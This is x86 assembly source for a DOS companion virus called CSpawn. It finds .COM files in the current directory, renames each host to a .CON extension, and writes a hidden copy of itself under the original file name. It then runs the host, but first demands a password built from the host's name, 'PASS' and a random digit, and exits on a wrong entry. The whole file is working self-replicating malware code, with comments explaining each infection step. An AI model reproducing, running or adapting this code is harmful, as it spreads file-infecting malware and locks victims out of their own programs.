.model tiny
.code
	ORG 100h 
CSpawn:

	MOV SP, OFFSET FINISH + 100h ;100h = dim of new stack - add this stack to the end of the code segment
	MOV AH, 4Ah ; function used to resize memory
	MOV BX, SP ; we need to calculate the number of paragraphs of the code
	MOV CL, 4 ; 2 at 4 = 16
	SHR BX, CL ;number of paragraphs div by 16
	INC BX ;+1
	int 21h
	XOR CX, CX ;cx = 0
	
	MOV BX, 2Ch ; at this offset in PSP you have the Environment segment
	MOV AX, [BX] ; AX = ENVIRONMENT segment
	MOV WORD PTR [PARAM_BLOCK], AX 
	MOV AX, CS
	MOV WORD PTR [PARAM_BLOCK+4], AX 
	MOV WORD PTR [PARAM_BLOCK+8], AX 
	MOV WORD PTR [PARAM_BLOCK+12], AX
	
	LEA SI, [REAL_NAME] ;load the address of REAL_NAME into SI
	;load string byte - instruction
	LODSB ;load a character from SI into AL 
	CMP AL, 0 ;compare the result with 0 in order to determine if this is the actual virus or not 
	JZ CONTINUE ;if the result is 0, then continue with the rest of the code 
	
	;else go to check password
	MOV AX, OFFSET INPUT_PASSWORD  
	PUSH AX ;push (stack) the offset of the buffer for reading characters from keyboard = INPUT_PASSWORD
	MOV AX, OFFSET ACTUAL_PASSWORD
	PUSH AX ;push (stack) the offset of the buffer where is stored the password = ACTUAL_PASSWORD
	MOV AX, OFFSET INPUT_TEXT
	PUSH AX ;string to display 
	MOV AX, OFFSET EXIT_TEXT
	PUSH AX ;string to display
	
	CALL CHECK_PASSWORD
	JMP CONTINUE
	
	CHECK_PASSWORD PROC
		PUSH BP
		MOV BP, SP
		
		MOV DI, [BP+10] ;DI POINTS TO INPUT BUFFER - used to retrieve the entered password
		MOV CX, 0000h ;clean cx
		MOV AH, 09h ;prepare to display a message
		MOV DX, [BP+6] ;here is the INPUT_TEXT
		int 21h
		
		;we displayed the input message at this point
		
		;loop used to read the input char by char
		READ_INPUT:
			MOV AH, 01H ;DOS function to read a character
			int 21H
			;This will get me AL=8bit data input = 1 character
			CMP AL, 13 ;Check if the Enter key (Carriage Return) is pressed
			JE END_INPUT ;if equal - then go to next part
			MOV [DI], AL ;else, add the caracter to the buffer
			INC DI ;go to next position in buffer
			INC CX ;add 1 in order to get the length of the buffer
			JMP READ_INPUT
			
		END_INPUT:
			MOV SI,[BP+8] ;SI POINTS TO THE ACTUAL PASSWORD
			CLD
			XOR AX, AX
			
			;here, i have in cx the length of the input password
			;i want to check if input length = password length - i will use the bx register in order to get the length
			
			MOV BX, 0000h	
			GET_ACTUAL_PASSWORD_LENGTH:	
				LODSB 
				CMP AL, 0
				JE COMPARE_LENGTH
				inc BX
				JMP GET_ACTUAL_PASSWORD_LENGTH		
			
			;if the lengths are not the same, then for sure the input password is not correct
			COMPARE_LENGTH:
				CMP CX, BX
				JNE PASSWORD_WRONG
			
			MOV SI, [BP+10] ;the input 
			MOV DI, [BP+8] ;the password
			PASSWORD_COMPARE_LOOP:
				LODSB        ; Load the byte from [SI] into AL and increment SI
				CMP AL, [DI] ; Compare the loaded byte with the user input
				JNZ PASSWORD_WRONG ; Jump to PASSWORD_WRONG if they don't match
				INC DI       ; Move to the next character in the user input
				LOOP PASSWORD_COMPARE_LOOP 
			
			PASSWORD_OK:
				POP BP
				ret 10
			
			PASSWORD_WRONG:
				MOV AH, 09h
				MOV DX, [BP+4] ;here is the exit text if the passwsord is not correct
				int 21h
				POP BP
				JMP END_PROGRAM ;just end everything here
	CHECK_PASSWORD endp	
	
	CONTINUE:
	XOR DI, DI
	XOR SI, SI
	XOR CX,CX
	XOR BX,BX
	cld 

	MOV DX, OFFSET REAL_NAME
	MOV BX, OFFSET PARAM_BLOCK
	MOV AX, 4B00h ;4B = function to launch a program in execution from another program - AL == 00 means Load & execute (03 = overlay)
	int 21h ; here we will execute the host1.com actually
	
	CLI ; clear interrupt flag when u came back from host
	MOV BX, AX ; save the RETURN CODE in BX
	
	MOV AX, CS 
	MOV SS, AX 
	;restore stack and cs => cs=ds=ss=es
	
	MOV SP, (FINISH - CSpawn) + 200h ;stack RESTORE / REALLOCATION
	STI ; RESTORE INTERRUPT flag
	
	PUSH BX ; so that you have the return code from host
	
	MOV DS, AX
	MOV ES, AX
	;cs=ds=ss=es
	
	MOV AH, 1Ah ;Set DTA function = in order to be sure that the dta of the host will not be affected by the search first/next functions
	MOV DX, 80h ; here are the command line values
	int 21h
	call FIND_FILES 
	POP AX ; cause AL holds the return value
	END_PROGRAM:
	MOV AH, 4Ch
	int 21h ;return control to dos and terminate program 
	
FIND_FILES:
		
	MOV DX, OFFSET COM_MASK  ;where you have the .com support
	MOV AH, 4Eh ; find first function
	XOR CX,CX ;holds the file attributes - we need this later 
		
		FIND_LOOP:
			int 21h ;execute function find-first
			JC FIND_DONE ;if no file was found - call RETURN
			CALL INFECT_FILE
			MOV AH, 4Fh ;find next function
			JMP FIND_LOOP ;go back and find more if possible
		FIND_DONE:
			ret
	
	COM_MASK DB '*.com',0
	
		INFECT_FILE:
		;start - destination index
			XOR SI, SI
			cld
			MOV SI, 9Eh ;at 9Eh is the name of the file that we found = NAME OF THE HOST
			;THIS NAME WILL BE SHARED BY BOTH HOST AND copy
			MOV DI, OFFSET REAL_NAME ; 	DI points to new name = REAL_NAME

			COPY_LOOP:
				LODSB ;Load a character from DS:SI into AL and inc SI at the same time
				STOSB ;store content of AL from above into ES:DI
				OR AL, AL ; if AL == 0 => ZERO FLAG = 1 (SET) => the copy of the name has been done
				JNZ COPY_LOOP ; make sure to copy everything in BUFFER  - the jump not zero is reffering to the zero flag which is 1 if al is 0
			
			MOV WORD PTR [DI-2], 'N' ;get the host.CON name stored
			MOV DX, 9Eh ;where it was the name of the host - current name --host.com
			MOV DI, OFFSET REAL_NAME ;this will be the new name  -- host.con
			MOV AH, 56h  ; change the name of the host1 from host1 to host1.con
			int 21h ;the carry flag should be 0
			JC INF_EXIT ; if cf != 0 -> you can not rename, so ret
			
			CREATE_FILE:
			MOV AH, 3Ch ;function for creating a new file
			MOV CX, 2 ;the file is hidden
			int 21h 
			
			MOV BX, AX ;bx holds file handle for the file
			PUSH BX ;save this into the stack in order to use bx in another context
			;PASSWORD = HOST NAME + PASS + RANDOM GENERATED NUMBER (0-9)
			GENERATE_PASSWORD:
				MOV SI, 9Eh ;at 9Eh is the name of the file that we found = NAME OF THE HOST
				MOV DI, OFFSET ACTUAL_PASSWORD ;this will be the password that we are going to set
				PASSWORD_LOOP:
				;load string byte
				LODSB ;Load a character from DS:SI into AL and increment SI
				CMP AL, '.' ;we know from the start that we don't need the .extension
				je FOUND_DOT
				;store string byte
				STOSB ;store content of AL from above into ES:DI -> ACTUAL_PASSWORD
				JMP PASSWORD_LOOP
			
			FOUND_DOT:
				MOV SI, OFFSET PASSWORD_DEMO ;we use this particle for concatenation
				LODSB ;get the first character from PASS
				;Continue copying characters from PASSWORD_DEMO to ACTUAL_PASSWORD
				COPY_PASS:
					STOSB
					LODSB ; Load the next character from PASSWORD_DEMO
					CMP AL, 0 ; Check for the null terminator
					JNE COPY_PASS ; Continue if not null terminator
					CALL GENERATE_RANDOM ;Call this procedure in order to get a random number - it will be concatenated to the ACTUAL_PASSWORD
					
			; Convert the random number in DL to ASCII
			ADD DL, '0'  ; Convert to ASCII character -30h
			; Append the ASCII character to the end of the string at DI
			MOV [DI], DL
			INC DI  ; Move DI to the next position in the string	 
			MOV WORD PTR [DI], 0 ;end password with 0

			DONE_PASSWORD:
			XOR SI, SI
			XOR DI,DI
			XOR AX, AX
			XOR CX,CX
			CLD
			POP BX
			MOV AH, 40H ;WRITE TO FILE function
			MOV CX, FINISH-CSpawn ;CX holds the size of the file
			MOV DX, OFFSET CSpawn ; DX points to the offset of the file
			int 21h
			
			MOV AH, 3Eh ; function for closing the created file
			int 21h
			
		INF_EXIT:
			ret
	
GENERATE_RANDOM proc
	PUSH BP
	MOV BP, SP
	XOR AX, AX
	MOV AH, 0 ;interrupts in order to get some time
	int 1AH ;number of clock is set in DX
	;this lines are supose to cause a delay in time
	
	;RESULT IS IN DX
	MOV AX, DX;1234h
	XOR DX,DX 
	MOV BX, 10 ;bx=10 will be our divisor because i want numbers between 0 and 9
	DIV BX ;divide ax by bx 
	;RESULT IS IN DL
	POP BP
	ret 
GENERATE_RANDOM endp
		
	;this are the variables used in the program == data segment
	REAL_NAME DB 13 dup (?) ;name of the host that will be executed 
	PARAM_BLOCK DW ?		;the environment segment
				DD 80h		; address of command line 
				DD 5Ch		; address of FCB 1
				DD 6Ch		; address of FCB 2
	PASSWORD_DEMO DB "PASS", 0
	ACTUAL_PASSWORD DB 13 dup (?)
	INPUT_TEXT DB "Please, enter password : $"
	EXIT_TEXT  DB "Incorrect password!$"
	INPUT_PASSWORD DB 13 dup (?)
FINISH:
end CSpawn